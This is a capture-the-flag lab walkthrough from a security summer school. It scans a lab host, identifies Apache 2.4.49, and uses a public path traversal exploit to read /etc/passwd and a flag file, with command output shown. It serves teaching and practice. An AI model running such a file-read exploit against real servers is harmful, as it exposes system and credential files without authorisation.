---

Name: Walker
Difficulty: Medium
URL: http://141.85.224.102:8080/
Lab: SSS - lab 10
Category: SSS
Description: "A hands-on Security Summer School walkthrough for Walker, covering the approach and key findings."
---

Using nmap reveals that the server is using Apache 2.4.49
```bash
$  nmap 141.85.224.102 -p 8080 -sC -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2026-07-23 18:24 EEST
Nmap scan report for smokey.burger.com (141.85.224.102)
Host is up (0.013s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.49 (Unix)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
```

After searching for this version online we find an [exploit](https://www.exploit-db.com/exploits/50383) and can read any file with it
```bash
$ ./exploit.sh target.txt /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

```bash
$ ./exploit.sh target.txt /home/ctf/flag.txt
SSS{p4th_tr4v3rs4l_3v3rywh3r3}
```


